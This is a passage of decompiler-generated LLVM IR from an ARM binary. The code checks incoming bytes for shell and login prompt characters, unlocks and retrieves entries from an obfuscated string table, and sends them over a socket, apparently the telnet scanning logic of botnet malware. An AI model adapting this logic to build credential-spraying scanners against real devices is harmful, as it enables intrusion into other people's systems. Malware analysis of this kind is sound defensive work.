  store i1 %v2_f4dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f4dc = icmp eq i8 %v3_f4f0, 37
  store i1 %v7_f4dc, i1* %cpsr_z.global-to-local, align 1
  %v1_f4e0 = add i32 %v0_f4e0, -1
  store i32 %v1_f4e0, i32* %r3.global-to-local, align 4
  br i1 %v7_f4dc, label %dec_label_pc_f500, label %dec_label_pc_f4e8

dec_label_pc_f4e8:                                ; preds = %dec_label_pc_f4e8.preheader, %dec_label_pc_f4dc
  %v0_f4e0 = phi i32 [ %v2_f4c0, %dec_label_pc_f4e8.preheader ], [ %v1_f4e0, %dec_label_pc_f4dc ]
  %v0_f4e8 = phi i32 [ %v1_f488, %dec_label_pc_f4e8.preheader ], [ %v1_f4e8, %dec_label_pc_f4dc ]
  %v1_f4e8 = add i32 %v0_f4e8, -1
  store i32 %v1_f4e8, i32* %r1.global-to-local, align 4
  %v2_f4e8 = icmp ne i32 %v0_f4e8, 0
  store i1 %v2_f4e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4e8 = icmp eq i32 %v0_f4e8, 1
  store i1 %v7_f4e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4e8, label %dec_label_pc_ef78.backedge.thread561, label %dec_label_pc_f4f0

dec_label_pc_f4f0:                                ; preds = %dec_label_pc_f4e8
  %v1_f4f0 = add i32 %v0_f4e0, -2
  %v2_f4f0 = inttoptr i32 %v1_f4f0 to i8*
  %v3_f4f0 = load i8, i8* %v2_f4f0, align 1
  %v4_f4f0 = zext i8 %v3_f4f0 to i32
  store i32 %v4_f4f0, i32* %r2.global-to-local, align 4
  %v2_f4f4 = icmp ugt i8 %v3_f4f0, 61
  store i1 %v2_f4f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f4f4 = icmp eq i8 %v3_f4f0, 62
  store i1 %v7_f4f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4f4, label %dec_label_pc_f500, label %bb442

bb442:                                            ; preds = %dec_label_pc_f4f0
  %v3_f4f8 = icmp ugt i8 %v3_f4f0, 57
  store i1 %v3_f4f8, i1* %cpsr_c.global-to-local, align 1
  %v8_f4f8 = icmp eq i8 %v3_f4f0, 58
  store i1 %v8_f4f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f4f8, label %dec_label_pc_f500, label %dec_label_pc_f4cc

dec_label_pc_f500:                                ; preds = %dec_label_pc_f4f0, %bb442, %dec_label_pc_f4dc, %dec_label_pc_f4d4, %dec_label_pc_f4cc, %dec_label_pc_f4b8, %dec_label_pc_f494, %dec_label_pc_f4b0, %dec_label_pc_f4a8, %bb441
  %v0_f504 = phi i32 [ %v1_f488, %dec_label_pc_f4b8 ], [ %v1_f488, %dec_label_pc_f494 ], [ %v1_f488, %dec_label_pc_f4b0 ], [ %v1_f488, %dec_label_pc_f4a8 ], [ %v1_f488, %bb441 ], [ %v1_f4e8, %dec_label_pc_f4cc ], [ %v1_f4e8, %dec_label_pc_f4d4 ], [ %v1_f4e8, %dec_label_pc_f4dc ], [ %v1_f4e8, %bb442 ], [ %v1_f4e8, %dec_label_pc_f4f0 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f504 = add i32 %v0_f504, 1
  store i32 %v1_f504, i32* @r7, align 4
  %v1_f508 = call i32 @table_unlock_val(i32 7)
  store i32 %v2_f828, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_f518 = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_f518, i32* %r0.global-to-local, align 4
  %v3_f51c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f51c, i32* %r2.global-to-local, align 4
  store i32 %v3_f518, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f528 = load i32, i32* @r6, align 4
  %v1_f528 = add i32 %v0_f528, 4
  %v2_f528 = inttoptr i32 %v1_f528 to i32*
  %v3_f528 = load i32, i32* %v2_f528, align 4
  store i32 %v3_f528, i32* %r0.global-to-local, align 4
  %v4_f52c = call i32 @__libc_send(i32 %v3_f528, i32 %v3_f518, i32 %v3_f51c, i32 16384)
  store i32 %v4_f52c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f53c = load i32, i32* @r6, align 4
  %v1_f53c = add i32 %v0_f53c, 4
  %v2_f53c = inttoptr i32 %v1_f53c to i32*
  %v3_f53c = load i32, i32* %v2_f53c, align 4
  store i32 %v3_f53c, i32* %r0.global-to-local, align 4
  %v4_f540 = call i32 @__libc_send(i32 %v3_f53c, i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f548 = call i32 @table_lock_val(i32 7)
  store i32 %v1_f548, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_f550 = load i32, i32* @r6, align 4
  %v2_f550 = add i32 %v1_f550, 12
  %v3_f550 = inttoptr i32 %v2_f550 to i32*
  store i32 6, i32* %v3_f550, align 4
  br label %dec_label_pc_f110

dec_label_pc_f5d0:                                ; preds = %dec_label_pc_eff4
  %v1_f5d0 = add i32 %v0_eff4, 24
  %v2_f5d0 = inttoptr i32 %v1_f5d0 to i32*
  %v3_f5d0 = load i32, i32* %v2_f5d0, align 4
  store i32 %v3_f5d0, i32* %r2.global-to-local, align 4
  %v1_f5d4 = add i32 %v3_f5d0, -1
  store i32 %v1_f5d4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5d8 = icmp eq i32 %v1_f5d4, 0
  store i1 %v2_f5d8, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_f5d4, 1
  br i1 %tmp443, label %dec_label_pc_ef78.backedge.thread, label %dec_label_pc_f5e0

dec_label_pc_f5e0:                                ; preds = %dec_label_pc_f5d0
  %v2_f5e0 = add i32 %v1_f5d4, %v0_eff4
  store i32 %v2_f5e0, i32* %r3.global-to-local, align 4
  %v1_f5e4 = add i32 %v2_f5e0, 28
  %v2_f5e4 = inttoptr i32 %v1_f5e4 to i8*
  %v3_f5e4 = load i8, i8* %v2_f5e4, align 1
  %v4_f5e4 = zext i8 %v3_f5e4 to i32
  store i32 %v4_f5e4, i32* %r3.global-to-local, align 4
  %v2_f5e8 = icmp ugt i8 %v3_f5e4, 61
  store i1 %v2_f5e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f5e8 = icmp eq i8 %v3_f5e4, 62
  store i1 %v7_f5e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5e8, label %dec_label_pc_f64c, label %bb444

bb444:                                            ; preds = %dec_label_pc_f5e0
  %v3_f5ec = icmp ugt i8 %v3_f5e4, 57
  store i1 %v3_f5ec, i1* %cpsr_c.global-to-local, align 1
  %v8_f5ec = icmp eq i8 %v3_f5e4, 58
  store i1 %v8_f5ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f5ec, label %dec_label_pc_f64c, label %dec_label_pc_f5f4

dec_label_pc_f5f4:                                ; preds = %bb444
  %v2_f5f4 = icmp ugt i8 %v3_f5e4, 35
  store i1 %v2_f5f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5f4 = icmp eq i8 %v3_f5e4, 36
  store i1 %v7_f5f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5f4, label %dec_label_pc_f64c, label %dec_label_pc_f5fc

dec_label_pc_f5fc:                                ; preds = %dec_label_pc_f5f4
  %v2_f5fc = icmp ugt i8 %v3_f5e4, 34
  store i1 %v2_f5fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f5fc = icmp eq i8 %v3_f5e4, 35
  store i1 %v7_f5fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5fc, label %dec_label_pc_f64c, label %dec_label_pc_f604

dec_label_pc_f604:                                ; preds = %dec_label_pc_f5fc
  %v2_f604 = icmp ugt i8 %v3_f5e4, 36
  store i1 %v2_f604, i1* %cpsr_c.global-to-local, align 1
  %v7_f604 = icmp eq i8 %v3_f5e4, 37
  store i1 %v7_f604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f604, label %dec_label_pc_f64c, label %dec_label_pc_f634.preheader

dec_label_pc_f634.preheader:                      ; preds = %dec_label_pc_f604
  %v3_f608 = add i32 %v0_eff4, 28
  %v2_f60c = add i32 %v3_f608, %v3_f5d0
  store i32 %v2_f60c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f634

dec_label_pc_f618:                                ; preds = %bb445
  %v2_f618 = icmp ugt i8 %v3_f63c, 35
  store i1 %v2_f618, i1* %cpsr_c.global-to-local, align 1
  %v7_f618 = icmp eq i8 %v3_f63c, 36
  store i1 %v7_f618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f618, label %dec_label_pc_f64c, label %dec_label_pc_f620

dec_label_pc_f620:                                ; preds = %dec_label_pc_f618
  %v2_f620 = icmp ugt i8 %v3_f63c, 34
  store i1 %v2_f620, i1* %cpsr_c.global-to-local, align 1
  %v7_f620 = icmp eq i8 %v3_f63c, 35
  store i1 %v7_f620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f620, label %dec_label_pc_f64c, label %dec_label_pc_f628

dec_label_pc_f628:                                ; preds = %dec_label_pc_f620
  %v2_f628 = icmp ugt i8 %v3_f63c, 36
  store i1 %v2_f628, i1* %cpsr_c.global-to-local, align 1
  %v7_f628 = icmp eq i8 %v3_f63c, 37
  store i1 %v7_f628, i1* %cpsr_z.global-to-local, align 1
  %v1_f62c = add i32 %v0_f62c, -1
  store i32 %v1_f62c, i32* %r3.global-to-local, align 4
  br i1 %v7_f628, label %dec_label_pc_f64c, label %dec_label_pc_f634

dec_label_pc_f634:                                ; preds = %dec_label_pc_f634.preheader, %dec_label_pc_f628
  %v0_f62c = phi i32 [ %v2_f60c, %dec_label_pc_f634.preheader ], [ %v1_f62c, %dec_label_pc_f628 ]
  %v0_f634 = phi i32 [ %v1_f5d4, %dec_label_pc_f634.preheader ], [ %v1_f634, %dec_label_pc_f628 ]
  %v1_f634 = add i32 %v0_f634, -1
  store i32 %v1_f634, i32* %r1.global-to-local, align 4
  %v2_f634 = icmp ne i32 %v0_f634, 0
  store i1 %v2_f634, i1* %cpsr_c.global-to-local, align 1
  %v7_f634 = icmp eq i32 %v0_f634, 1
  store i1 %v7_f634, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f634, label %dec_label_pc_ef78.backedge.thread561, label %dec_label_pc_f63c

dec_label_pc_f63c:                                ; preds = %dec_label_pc_f634
  %v1_f63c = add i32 %v0_f62c, -2
  %v2_f63c = inttoptr i32 %v1_f63c to i8*
  %v3_f63c = load i8, i8* %v2_f63c, align 1
  %v4_f63c = zext i8 %v3_f63c to i32
  store i32 %v4_f63c, i32* %r2.global-to-local, align 4
  %v2_f640 = icmp ugt i8 %v3_f63c, 61
  store i1 %v2_f640, i1* %cpsr_c.global-to-local, align 1
  %v7_f640 = icmp eq i8 %v3_f63c, 62
  store i1 %v7_f640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f640, label %dec_label_pc_f64c, label %bb445

bb445:                                            ; preds = %dec_label_pc_f63c
  %v3_f644 = icmp ugt i8 %v3_f63c, 57
  store i1 %v3_f644, i1* %cpsr_c.global-to-local, align 1
  %v8_f644 = icmp eq i8 %v3_f63c, 58
  store i1 %v8_f644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f644, label %dec_label_pc_f64c, label %dec_label_pc_f618

dec_label_pc_f64c:                                ; preds = %dec_label_pc_f63c, %bb445, %dec_label_pc_f628, %dec_label_pc_f620, %dec_label_pc_f618, %dec_label_pc_f604, %dec_label_pc_f5e0, %dec_label_pc_f5fc, %dec_label_pc_f5f4, %bb444
  %v0_f650 = phi i32 [ %v1_f5d4, %dec_label_pc_f604 ], [ %v1_f5d4, %dec_label_pc_f5e0 ], [ %v1_f5d4, %dec_label_pc_f5fc ], [ %v1_f5d4, %dec_label_pc_f5f4 ], [ %v1_f5d4, %bb444 ], [ %v1_f634, %dec_label_pc_f618 ], [ %v1_f634, %dec_label_pc_f620 ], [ %v1_f634, %dec_label_pc_f628 ], [ %v1_f634, %bb445 ], [ %v1_f634, %dec_label_pc_f63c ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f650 = add i32 %v0_f650, 1
  store i32 %v1_f650, i32* @r7, align 4
  %v1_f654 = call i32 @table_unlock_val(i32 6)
  store i32 %v2_f828, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_f664 = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_f664, i32* %r0.global-to-local, align 4
  %v3_f668 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f668, i32* %r2.global-to-local, align 4
  store i32 %v3_f664, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f674 = load i32, i32* @r6, align 4
  %v1_f674 = add i32 %v0_f674, 4
  %v2_f674 = inttoptr i32 %v1_f674 to i32*
  %v3_f674 = load i32, i32* %v2_f674, align 4
  store i32 %v3_f674, i32* %r0.global-to-local, align 4
  %v4_f678 = call i32 @__libc_send(i32 %v3_f674, i32 %v3_f664, i32 %v3_f668, i32 16384)
  store i32 %v4_f678, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f688 = load i32, i32* @r6, align 4
  %v1_f688 = add i32 %v0_f688, 4
  %v2_f688 = inttoptr i32 %v1_f688 to i32*
  %v3_f688 = load i32, i32* %v2_f688, align 4
  store i32 %v3_f688, i32* %r0.global-to-local, align 4
  %v4_f68c = call i32 @__libc_send(i32 %v3_f688, i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f694 = call i32 @table_lock_val(i32 6)
  store i32 %v1_f694, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_f69c = load i32, i32* @r6, align 4
  %v2_f69c = add i32 %v1_f69c, 12
  %v3_f69c = inttoptr i32 %v2_f69c to i32*
  store i32 8, i32* %v3_f69c, align 4
  br label %dec_label_pc_f110

dec_label_pc_f6a4:                                ; preds = %dec_label_pc_eff4
  %v1_f6a4 = add i32 %v0_eff4, 24
  %v2_f6a4 = inttoptr i32 %v1_f6a4 to i32*
  %v3_f6a4 = load i32, i32* %v2_f6a4, align 4
  store i32 %v3_f6a4, i32* %r2.global-to-local, align 4
  %v1_f6a8 = add i32 %v3_f6a4, -1
  store i32 %v1_f6a8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6ac = icmp eq i32 %v1_f6a8, 0
  store i1 %v2_f6ac, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_f6a8, 1
  br i1 %tmp446, label %dec_label_pc_f710, label %dec_label_pc_f6b4

dec_label_pc_f6b4:                                ; preds = %dec_label_pc_f6a4
  %v2_f6b4 = add i32 %v1_f6a8, %v0_eff4
  store i32 %v2_f6b4, i32* %r3.global-to-local, align 4
  %v1_f6b8 = add i32 %v2_f6b4, 28
  %v2_f6b8 = inttoptr i32 %v1_f6b8 to i8*
  %v3_f6b8 = load i8, i8* %v2_f6b8, align 1
  %v4_f6b8 = zext i8 %v3_f6b8 to i32
  store i32 %v4_f6b8, i32* %r3.global-to-local, align 4
  %v2_f6bc = icmp ugt i8 %v3_f6b8, 61
  store i1 %v2_f6bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f6bc = icmp eq i8 %v3_f6b8, 62
  store i1 %v7_f6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6bc, label %dec_label_pc_f978, label %bb447

bb447:                                            ; preds = %dec_label_pc_f6b4
  %v3_f6c0 = icmp ugt i8 %v3_f6b8, 57
  store i1 %v3_f6c0, i1* %cpsr_c.global-to-local, align 1
  %v8_f6c0 = icmp eq i8 %v3_f6b8, 58
  store i1 %v8_f6c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f6c0, label %dec_label_pc_f978, label %dec_label_pc_f6c8

dec_label_pc_f6c8:                                ; preds = %bb447
  %v2_f6c8 = icmp ugt i8 %v3_f6b8, 35
  store i1 %v2_f6c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f6c8 = icmp eq i8 %v3_f6b8, 36
  store i1 %v7_f6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6c8, label %dec_label_pc_f978, label %dec_label_pc_f6d0

dec_label_pc_f6d0:                                ; preds = %dec_label_pc_f6c8
  %v2_f6d0 = icmp ugt i8 %v3_f6b8, 34
  store i1 %v2_f6d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f6d0 = icmp eq i8 %v3_f6b8, 35
  store i1 %v7_f6d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6d0, label %dec_label_pc_f978, label %dec_label_pc_f708.preheader

dec_label_pc_f708.preheader:                      ; preds = %dec_label_pc_f6d0
  %v3_f6d4 = add i32 %v0_eff4, 28
  %v2_f6d8 = add i32 %v3_f6d4, %v3_f6a4
  store i32 %v2_f6d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f708

dec_label_pc_f6e4:                                ; preds = %dec_label_pc_f708
  %v1_f6e4 = add i32 %v0_f700, -2
  %v2_f6e4 = inttoptr i32 %v1_f6e4 to i8*
  %v3_f6e4 = load i8, i8* %v2_f6e4, align 1
  %v4_f6e4 = zext i8 %v3_f6e4 to i32
  store i32 %v4_f6e4, i32* %r2.global-to-local, align 4
  %v2_f6e8 = icmp ugt i8 %v3_f6e4, 61
  store i1 %v2_f6e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f6e8 = icmp eq i8 %v3_f6e4, 62
  store i1 %v7_f6e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6e8, label %dec_label_pc_f978, label %bb448

bb448:                                            ; preds = %dec_label_pc_f6e4
  %v3_f6ec = icmp ugt i8 %v3_f6e4, 57
  store i1 %v3_f6ec, i1* %cpsr_c.global-to-local, align 1
  %v8_f6ec = icmp eq i8 %v3_f6e4, 58
  store i1 %v8_f6ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f6ec, label %dec_label_pc_f978, label %dec_label_pc_f6f4

dec_label_pc_f6f4:                                ; preds = %bb448
  %v2_f6f4 = icmp ugt i8 %v3_f6e4, 35
  store i1 %v2_f6f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6f4 = icmp eq i8 %v3_f6e4, 36
  store i1 %v7_f6f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6f4, label %dec_label_pc_f978, label %dec_label_pc_f6fc

dec_label_pc_f6fc:                                ; preds = %dec_label_pc_f6f4
  %v2_f6fc = icmp ugt i8 %v3_f6e4, 34
  store i1 %v2_f6fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f6fc = icmp eq i8 %v3_f6e4, 35
  store i1 %v7_f6fc, i1* %cpsr_z.global-to-local, align 1
  %v1_f700 = add i32 %v0_f700, -1
  store i32 %v1_f700, i32* %r3.global-to-local, align 4
  br i1 %v7_f6fc, label %dec_label_pc_f978, label %dec_label_pc_f708

dec_label_pc_f708:                                ; preds = %dec_label_pc_f708.preheader, %dec_label_pc_f6fc
  %v0_f700 = phi i32 [ %v2_f6d8, %dec_label_pc_f708.preheader ], [ %v1_f700, %dec_label_pc_f6fc ]
  %v0_f708 = phi i32 [ %v1_f6a8, %dec_label_pc_f708.preheader ], [ %v1_f708, %dec_label_pc_f6fc ]
  %v1_f708 = add i32 %v0_f708, -1
  store i32 %v1_f708, i32* %r1.global-to-local, align 4
  %v2_f708 = icmp ne i32 %v0_f708, 0
  store i1 %v2_f708, i1* %cpsr_c.global-to-local, align 1
  %v7_f708 = icmp eq i32 %v0_f708, 1
  store i1 %v7_f708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f708, label %dec_label_pc_f710, label %dec_label_pc_f6e4

dec_label_pc_f710:                                ; preds = %dec_label_pc_f708, %dec_label_pc_f6a4
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_f714 = call i32 @table_unlock_val(i32 28)
  store i32 %v2_f828, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v3_f724 = call i32 @table_retrieve_val(i32 28, i32* nonnull %stack_var_-60)
  %v3_f728 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f724, i32* %r2.global-to-local, align 4
  %v1_f730 = add i32 %v3_f728, -1
  store i32 %v1_f730, i32* %r3.global-to-local, align 4
  %v0_f734 = load i32, i32* @sb, align 4
  store i32 %v0_f734, i32* %r0.global-to-local, align 4
  %v0_f738 = load i32, i32* @r6, align 4
  %v1_f738 = add i32 %v0_f738, 24
  %v2_f738 = inttoptr i32 %v1_f738 to i32*
  %v3_f738 = load i32, i32* %v2_f738, align 4
  store i32 %v3_f738, i32* %r1.global-to-local, align 4
  %v4_f73c = call i32 @util_memsearch(i32 %v0_f734, i32 %v3_f738, i32 %v3_f724, i32 %v1_f730)
  store i32 %v4_f73c, i32* %r0.global-to-local, align 4
  %v1_f740 = add i32 %v4_f73c, 1
  store i32 %v1_f740, i32* @r7, align 4
  %v2_f740 = icmp eq i32 %v4_f73c, -1
  store i1 %v2_f740, i1* %cpsr_c.global-to-local, align 1
  %v7_f740 = icmp eq i32 %v1_f740, 0
  store i1 %v7_f740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f740, label %thread-pre-split124, label %bb449

bb449:                                            ; preds = %dec_label_pc_f710
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split124

thread-pre-split124:                              ; preds = %dec_label_pc_f710, %bb449
  %v0_f748 = phi i1 [ false, %bb449 ], [ true, %dec_label_pc_f710 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_f748, i1* %cpsr_z.global-to-local, align 1
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_fb94 = call i32 @table_lock_val(i32 28)
  br i1 %v0_f748, label %dec_label_pc_fb90, label %dec_label_pc_f758

dec_label_pc_f758:                                ; preds = %thread-pre-split124, %dec_label_pc_f978
  %storemerge = phi i32 [ %v1_f980, %dec_label_pc_f978 ], [ %v1_fb94, %thread-pre-split124 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_f758 = load i32, i32* @r6, align 4
  %v1_f758 = inttoptr i32 %v0_f758 to i32*
  %v2_f758 = load i32, i32* %v1_f758, align 4
  store i32 %v2_f758, i32* %r3.global-to-local, align 4
  %v1_f75c = add i32 %v0_f758, 4
  %v2_f75c = inttoptr i32 %v1_f75c to i32*
  %v3_f75c = load i32, i32* %v2_f75c, align 4
  store i32 %v3_f75c, i32* %r0.global-to-local, align 4
  %v1_f760 = add i32 %v2_f758, 13
  %v2_f760 = inttoptr i32 %v1_f760 to i8*
  %v3_f760 = load i8, i8* %v2_f760, align 1
  %v4_f760 = zext i8 %v3_f760 to i32
  store i32 %v4_f760, i32* %r2.global-to-local, align 4
  %v1_f764 = add i32 %v2_f758, 4
  %v2_f764 = inttoptr i32 %v1_f764 to i32*
  %v3_f764 = load i32, i32* %v2_f764, align 4
  store i32 %v3_f764, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f76c = call i32 @__libc_send(i32 %v3_f75c, i32 %v3_f764, i32 %v4_f760, i32 16384)
  store i32 %v4_f76c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f774 = load i32, i32* @r6, align 4
  %v1_f774 = add i32 %v0_f774, 4
  %v2_f774 = inttoptr i32 %v1_f774 to i32*
  %v3_f774 = load i32, i32* %v2_f774, align 4
  store i32 %v3_f774, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f780 = call i32 @__libc_send(i32 %v3_f774, i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32 2, i32 16384)
  store i32 %v4_f780, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_f788 = load i32, i32* @r6, align 4
  %v2_f788 = add i32 %v1_f788, 12
  %v3_f788 = inttoptr i32 %v2_f788 to i32*
  store i32 5, i32* %v3_f788, align 4
  br label %dec_label_pc_f78c

dec_label_pc_f78c:                                ; preds = %dec_label_pc_f3a0, %bb436, %dec_label_pc_f89c, %dec_label_pc_f9d4, %dec_label_pc_f940, %dec_label_pc_fa18, %dec_label_pc_f758
  %v0_f78c = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f78c = icmp eq i32 %v0_f78c, 0
  store i1 %v2_f78c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f78c, label %dec_label_pc_ef74.loopexit, label %dec_label_pc_f110

dec_label_pc_f798:                                ; preds = %dec_label_pc_eff4
  %v1_f798 = add i32 %v0_eff4, 24
  %v2_f798 = inttoptr i32 %v1_f798 to i32*
  %v3_f798 = load i32, i32* %v2_f798, align 4
  store i32 %v3_f798, i32* %r2.global-to-local, align 4
  %v1_f79c = add i32 %v3_f798, -1
  store i32 %v1_f79c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f7a0 = icmp eq i32 %v1_f79c, 0
  store i1 %v2_f7a0, i1* %cpsr_z.global-to-local, align 1
  %tmp450 = icmp slt i32 %v1_f79c, 1
  br i1 %tmp450, label %dec_label_pc_f814, label %dec_label_pc_f7a8

dec_label_pc_f7a8:                                ; preds = %dec_label_pc_f798
  %v2_f7a8 = add i32 %v1_f79c, %v0_eff4
  store i32 %v2_f7a8, i32* %r3.global-to-local, align 4
  %v1_f7ac = add i32 %v2_f7a8, 28
  %v2_f7ac = inttoptr i32 %v1_f7ac to i8*
  %v3_f7ac = load i8, i8* %v2_f7ac, align 1
  %v4_f7ac = zext i8 %v3_f7ac to i32
  store i32 %v4_f7ac, i32* %r3.global-to-local, align 4
  %v2_f7b0 = icmp ugt i8 %v3_f7ac, 61
  store i1 %v2_f7b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7b0 = icmp eq i8 %v3_f7ac, 62
  store i1 %v7_f7b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7b0, label %dec_label_pc_f92c, label %bb451

bb451:                                            ; preds = %dec_label_pc_f7a8
  %v3_f7b4 = icmp ugt i8 %v3_f7ac, 57
  store i1 %v3_f7b4, i1* %cpsr_c.global-to-local, align 1
  %v8_f7b4 = icmp eq i8 %v3_f7ac, 58
  store i1 %v8_f7b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f7b4, label %dec_label_pc_f92c, label %dec_label_pc_f7bc

dec_label_pc_f7bc:                                ; preds = %bb451
  %v2_f7bc = icmp ugt i8 %v3_f7ac, 35
  store i1 %v2_f7bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f7bc = icmp eq i8 %v3_f7ac, 36
  store i1 %v7_f7bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7bc, label %dec_label_pc_f92c, label %dec_label_pc_f7c4

dec_label_pc_f7c4:                                ; preds = %dec_label_pc_f7bc
  %v2_f7c4 = icmp ugt i8 %v3_f7ac, 34
  store i1 %v2_f7c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7c4 = icmp eq i8 %v3_f7ac, 35
  store i1 %v7_f7c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7c4, label %dec_label_pc_f92c, label %dec_label_pc_f7cc

dec_label_pc_f7cc:                                ; preds = %dec_label_pc_f7c4
  %v2_f7cc = icmp ugt i8 %v3_f7ac, 36
  store i1 %v2_f7cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f7cc = icmp eq i8 %v3_f7ac, 37
  store i1 %v7_f7cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7cc, label %dec_label_pc_f92c, label %dec_label_pc_f80c.preheader

dec_label_pc_f80c.preheader:                      ; preds = %dec_label_pc_f7cc
  %v3_f7d0 = add i32 %v0_eff4, 28
  %v2_f7d4 = add i32 %v3_f7d0, %v3_f798
  store i32 %v2_f7d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f80c

dec_label_pc_f7e0:                                ; preds = %dec_label_pc_f80c
  %v1_f7e0 = add i32 %v0_f804, -2
  %v2_f7e0 = inttoptr i32 %v1_f7e0 to i8*
  %v3_f7e0 = load i8, i8* %v2_f7e0, align 1
  %v4_f7e0 = zext i8 %v3_f7e0 to i32
  store i32 %v4_f7e0, i32* %r2.global-to-local, align 4
  %v2_f7e4 = icmp ugt i8 %v3_f7e0, 61
  store i1 %v2_f7e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7e4 = icmp eq i8 %v3_f7e0, 62
  store i1 %v7_f7e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7e4, label %dec_label_pc_f92c, label %bb452

bb452:                                            ; preds = %dec_label_pc_f7e0
  %v3_f7e8 = icmp ugt i8 %v3_f7e0, 57
  store i1 %v3_f7e8, i1* %cpsr_c.global-to-local, align 1
  %v8_f7e8 = icmp eq i8 %v3_f7e0, 58
